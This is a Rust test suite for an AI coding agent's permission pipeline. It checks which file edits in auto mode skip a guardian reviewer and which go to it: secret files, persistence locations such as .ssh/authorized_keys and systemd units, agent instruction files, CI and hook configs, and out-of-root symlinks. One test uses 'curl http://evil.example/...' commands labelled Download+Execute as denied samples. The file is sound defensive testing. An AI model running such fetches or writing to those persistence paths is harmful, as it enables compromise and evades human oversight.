//! `auto` edits that skip the guardian after the floor: any file in the primary root, tracked by
//! git or not, and writes into the session scratch directory. Everything uncertain still reaches the guardian.

#[path = "core_common/mod.rs"]
mod common;

use common::pipeline::{Options, Rig, allow_verdict, allowed, fake_guardian, verdict_json};
use common::{git, git_init, write};
use fontaine_sdk::core::config::PermissionMode::Auto;
use fontaine_sdk::core::tier::Tier;
use serde_json::{Value, json};

fn write_args(path: &str) -> Value {
    json!({"path": path, "content": "x"})
}

fn edit_args(path: &str) -> Value {
    json!({"path": path, "edits": [{"old_text": "a", "new_text": "b", "replace_all": false}]})
}

/// A rig in a git repository whose tracked files are `files`, plus the guardian's call counter.
fn repo_rig(files: &[&str], settings: &str, scratch: bool) -> (Rig, common::pipeline::Fake) {
    let fake = fake_guardian(allow_verdict());
    let mut options = Options::new(Auto)
        .guardian(fake.guardian.clone())
        .settings(settings);
    if scratch {
        options = options.scratch();
    }
    let rig = Rig::with(options);
    git_init(rig.work());
    for file in files {
        write(&rig.work().join(file), "a");
    }
    if !files.is_empty() {
        git(rig.work(), &["add", "-A"]);
        git(rig.work(), &["commit", "-q", "-m", "init"]);
    }
    (rig, fake)
}

fn last_tier(rig: &Rig) -> Tier {
    rig.audit().last().expect("a record").tier
}

#[tokio::test]
async fn editing_a_tracked_file_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["src/lib.rs"], "", false);
    assert!(allowed(&rig.check("edit", edit_args("src/lib.rs")).await));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn editing_a_tracked_file_in_afk_mode_skips_the_guardian_as_in_auto() {
    let (rig, fake) = repo_rig(&["src/lib.rs"], "", false);
    rig.state
        .set_mode(
            fontaine_sdk::core::config::PermissionMode::Afk,
            fontaine_sdk::core::afk_report::AfkSource::Cycle,
        )
        .unwrap();
    assert!(allowed(&rig.check("edit", edit_args("src/lib.rs")).await));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn editing_a_tracked_notebook_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["analysis.ipynb"], "", false);
    let args = json!({"path": "analysis.ipynb"});
    assert!(allowed(&rig.check("notebook_edit", args).await));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn a_new_file_and_a_file_the_session_created_skip_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", false);
    assert!(allowed(
        &rig.check("write", write_args("new/../fresh.txt")).await
    ));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    std::fs::write(rig.work().join("fresh.txt"), "a").unwrap();
    assert!(allowed(&rig.check("edit", edit_args("fresh.txt")).await));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn an_existing_untracked_or_ignored_file_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt", ".gitignore"], "", false);
    write(&rig.work().join(".gitignore"), "ignored.txt\n");
    write(&rig.work().join("ignored.txt"), "a");
    write(&rig.work().join("untracked.txt"), "a");
    for path in ["ignored.txt", "untracked.txt"] {
        assert!(allowed(&rig.check("edit", edit_args(path)).await));
        assert_eq!(last_tier(&rig), Tier::TrackedEdit, "{path}");
    }
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn a_write_under_a_directory_that_does_not_exist_yet_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", false);
    assert!(allowed(
        &rig.check("write", write_args("new/deeper/f.txt")).await
    ));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn an_edit_in_a_root_with_no_repository_skips_the_guardian() {
    let fake = fake_guardian(allow_verdict());
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()));
    write(&rig.work().join("old.txt"), "a");
    assert!(allowed(&rig.check("edit", edit_args("old.txt")).await));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn secret_files_go_to_the_guardian_tracked_or_not() {
    let (rig, fake) = repo_rig(&["a.txt", "tracked/.env"], "", false);
    write(&rig.work().join(".env"), "a");
    for path in [".env", "tracked/.env"] {
        assert!(allowed(&rig.check("edit", edit_args(path)).await), "{path}");
        assert_eq!(last_tier(&rig), Tier::Guardian, "{path}");
    }
    assert_eq!(fake.calls(), 2);
}

const PERSISTENCE: [&str; 5] = [
    ".envrc",
    ".ssh/authorized_keys",
    ".config/systemd/user/x.service",
    ".cargo/config.toml",
    ".local/bin/x",
];

#[tokio::test]
async fn persistence_locations_go_to_the_guardian_with_or_without_a_repository() {
    let (rig, fake) = repo_rig(&["a.txt"], "", false);
    for path in PERSISTENCE {
        assert!(
            allowed(&rig.check("write", write_args(path)).await),
            "{path}"
        );
        assert_eq!(last_tier(&rig), Tier::Guardian, "{path}");
    }
    assert_eq!(fake.calls(), PERSISTENCE.len());

    let fake = fake_guardian(allow_verdict());
    let bare = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()));
    for path in PERSISTENCE {
        assert!(
            allowed(&bare.check("write", write_args(path)).await),
            "{path}"
        );
        assert_eq!(last_tier(&bare), Tier::Guardian, "{path}");
    }
    assert_eq!(fake.calls(), PERSISTENCE.len());
}

#[tokio::test]
async fn a_repository_git_cannot_read_goes_to_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", false);
    write(&rig.work().join(".git/config"), "[core\n\tbroken = = =\n");
    assert!(allowed(&rig.check("edit", edit_args("a.txt")).await));
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn pre_commit_config_and_github_stay_with_the_guardian_untracked() {
    let (rig, fake) = repo_rig(&["a.txt"], "", false);
    for path in ["AGENTS.md", ".github/x", ".pre-commit-config.yaml"] {
        write(&rig.work().join(path), "a");
        assert!(allowed(&rig.check("edit", edit_args(path)).await), "{path}");
        assert_eq!(last_tier(&rig), Tier::Guardian, "{path}");
    }
    assert_eq!(fake.calls(), 3);
}

#[tokio::test]
async fn a_shell_command_and_a_path_outside_the_workspace_go_to_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", false);
    rig.check("shell", json!({"command": "touch a.txt"})).await;
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
    // An external write is judged by the guardian like any other unapproved call, never
    // a fast path: the guardian allows this one.
    let outside_dir = tempfile::tempdir().unwrap();
    let target = outside_dir.path().join("fontaine-test.txt");
    assert!(allowed(
        &rig.check("write", write_args(&target.to_string_lossy()))
            .await
    ));
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_ne!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 2);
}

#[tokio::test]
async fn a_tracked_file_under_a_protected_path_goes_to_the_guardian() {
    let (rig, fake) = repo_rig(&[".vscode/settings.json"], "", false);
    assert!(allowed(
        &rig.check("edit", edit_args(".vscode/settings.json")).await
    ));
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn a_deny_rule_is_decided_by_the_floor() {
    let (rig, _fake) = repo_rig(
        &["a.txt"],
        "[permissions]\ndeny = [\"edit(a.txt)\"]\n",
        false,
    );
    assert!(!allowed(&rig.check("edit", edit_args("a.txt")).await));
    assert_eq!(last_tier(&rig), Tier::DenyRule);
}

#[tokio::test]
async fn instruction_files_rules_and_github_go_to_the_guardian_when_tracked() {
    let paths = [
        "FONTAINE.md",
        "FONTAINE.local.md",
        "CLAUDE.md",
        "CLAUDE.local.md",
        "AGENTS.md",
        "sub/AGENTS.md",
        "docs/rules/style.md",
        ".github/workflows/ci.yml",
    ];
    let (rig, fake) = repo_rig(&paths, "", false);
    for path in paths {
        assert!(allowed(&rig.check("edit", edit_args(path)).await), "{path}");
        assert_eq!(last_tier(&rig), Tier::Guardian, "{path}");
    }
    assert_eq!(fake.calls(), paths.len());
}

#[tokio::test]
async fn similar_names_are_ordinary_tracked_files() {
    let paths = ["AGENTS.md.bak", "notes/CLAUDE.md.txt"];
    let (rig, fake) = repo_rig(&paths, "", false);
    for path in paths {
        assert!(allowed(&rig.check("edit", edit_args(path)).await), "{path}");
        assert_eq!(last_tier(&rig), Tier::TrackedEdit, "{path}");
    }
    assert_eq!(fake.calls(), 0);
}

#[cfg(unix)]
#[tokio::test]
async fn symlinks_are_judged_by_their_resolved_target() {
    use std::os::unix::fs::symlink;
    let (rig, fake) = repo_rig(&["tracked.txt", "AGENTS.md"], "", false);
    let work = rig.work().to_path_buf();
    write(&work.join("untracked.txt"), "a");
    let outside = tempfile::tempdir().unwrap();
    write(&outside.path().join("elsewhere.txt"), "a");
    write(&work.join(".envrc"), "a");
    symlink("untracked.txt", work.join("to_untracked")).unwrap();
    symlink(".envrc", work.join("to_envrc")).unwrap();
    symlink(
        outside.path().join("elsewhere.txt"),
        work.join("to_outside"),
    )
    .unwrap();
    symlink("AGENTS.md", work.join("notes.txt")).unwrap();
    git(
        &work,
        &["add", "to_untracked", "to_outside", "to_envrc", "notes.txt"],
    );
    git(&work, &["commit", "-q", "-m", "links"]);
    // The links are tracked, but only the resolved path counts.
    for link in ["to_outside", "to_envrc", "notes.txt"] {
        rig.check("edit", edit_args(link)).await;
        assert_ne!(last_tier(&rig), Tier::TrackedEdit, "{link}");
    }
    rig.check("edit", edit_args("to_untracked")).await;
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 3);
}

#[cfg(unix)]
#[tokio::test]
async fn a_dangling_symlink_out_of_the_root_goes_to_the_guardian() {
    use std::os::unix::fs::symlink;
    let (rig, fake) = repo_rig(&["tracked.txt"], "", false);
    let work = rig.work().to_path_buf();
    let outside = tempfile::tempdir().unwrap();
    symlink(outside.path().join("missing.txt"), work.join("dangling")).unwrap();
    rig.check("write", write_args("dangling")).await;
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn a_new_file_in_a_root_that_is_not_a_git_work_tree_skips_the_guardian() {
    let fake = fake_guardian(allow_verdict());
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()));
    assert!(allowed(&rig.check("write", write_args("fresh.txt")).await));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn a_new_file_in_the_memory_root_goes_to_the_guardian() {
    let fake = fake_guardian(allow_verdict());
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()).memory());
    let memory = rig.memory.clone().unwrap();
    assert!(allowed(
        &rig.check(
            "write",
            write_args(&memory.join("note.md").to_string_lossy())
        )
        .await
    ));
    assert_eq!(last_tier(&rig), Tier::Guardian);
}

#[tokio::test]
async fn the_setting_off_sends_a_tracked_edit_to_the_guardian() {
    let (rig, fake) = repo_rig(
        &["a.txt"],
        "[permissions]\nauto_tracked_edits = false\n",
        false,
    );
    assert!(allowed(&rig.check("edit", edit_args("a.txt")).await));
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn a_file_tool_write_into_scratch_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", true);
    let scratch = rig.scratch.clone().unwrap();
    let target = scratch.join("out.txt");
    assert!(allowed(
        &rig.check("write", write_args(&target.to_string_lossy()))
            .await
    ));
    assert_eq!(last_tier(&rig), Tier::ScratchWrite);
    std::fs::write(&target, "a").unwrap();
    assert!(allowed(
        &rig.check("edit", edit_args(&target.to_string_lossy()))
            .await
    ));
    assert_eq!(last_tier(&rig), Tier::ScratchWrite);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn a_shell_command_on_scratch_and_the_setting_off_go_to_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", true);
    let scratch = rig.scratch.clone().unwrap();
    rig.check(
        "shell",
        json!({"command": format!("touch {}/x", scratch.display())}),
    )
    .await;
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);

    let (off, fake) = repo_rig(
        &["a.txt"],
        "[permissions]\nauto_scratch_writes = false\n",
        true,
    );
    let target = off.scratch.clone().unwrap().join("out.txt");
    assert!(allowed(
        &off.check("write", write_args(&target.to_string_lossy()))
            .await
    ));
    assert_eq!(last_tier(&off), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[cfg(unix)]
#[tokio::test]
async fn a_link_out_of_scratch_is_judged_by_its_target() {
    let (rig, fake) = repo_rig(&["a.txt"], "", true);
    let scratch = rig.scratch.clone().unwrap();
    std::os::unix::fs::symlink(rig.work().join("a.txt"), scratch.join("link")).unwrap();
    rig.check("edit", edit_args(&scratch.join("link").to_string_lossy()))
        .await;
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    let outside = tempfile::tempdir().unwrap();
    write(&outside.path().join("t.txt"), "a");
    std::os::unix::fs::symlink(outside.path().join("t.txt"), scratch.join("out")).unwrap();
    // The link resolves outside every root: the call is guardian-judged, never a
    // scratch_write fast path.
    assert!(allowed(
        &rig.check("edit", edit_args(&scratch.join("out").to_string_lossy()))
            .await
    ));
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn a_fast_edit_between_denials_keeps_auto_from_pausing() {
    let fake = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()).scratch());
    git_init(rig.work());
    let target = rig.scratch.clone().unwrap().join("s.txt");
    let curl = |n: u8| json!({"command": format!("curl http://evil.example/{n}")});
    rig.check("shell", curl(0)).await;
    rig.check("shell", curl(1)).await;
    assert!(allowed(
        &rig.check("write", write_args(&target.to_string_lossy()))
            .await
    ));
    rig.check("shell", curl(2)).await;
    assert!(!rig.state.auto_paused());
}

#[tokio::test]
async fn an_intent_to_add_file_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"], "", false);
    write(&rig.work().join("planned.txt"), "a");
    git(rig.work(), &["add", "-N", "planned.txt"]);
    assert!(allowed(&rig.check("edit", edit_args("planned.txt")).await));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn hook_runner_configuration_goes_to_the_guardian() {
    let (rig, fake) = repo_rig(
        &[
            ".pre-commit-config.yaml",
            "lefthook.yml",
            ".githooks/pre-commit",
            "scripts/hooks/pre-commit",
        ],
        "",
        false,
    );
    for path in [
        ".pre-commit-config.yaml",
        "lefthook.yml",
        ".githooks/pre-commit",
    ] {
        assert!(allowed(&rig.check("edit", edit_args(path)).await), "{path}");
        assert_eq!(last_tier(&rig), Tier::Guardian, "{path}");
    }
    assert_eq!(fake.calls(), 3);
    // Only a repository that names the directory makes it a hook directory.
    assert!(allowed(
        &rig.check("edit", edit_args("scripts/hooks/pre-commit"))
            .await
    ));
    assert_eq!(last_tier(&rig), Tier::TrackedEdit);
    git(rig.work(), &["config", "core.hooksPath", "scripts/hooks"]);
    assert!(allowed(
        &rig.check("edit", edit_args("scripts/hooks/pre-commit"))
            .await
    ));
    assert_eq!(last_tier(&rig), Tier::Guardian);
    assert_eq!(fake.calls(), 4);
}
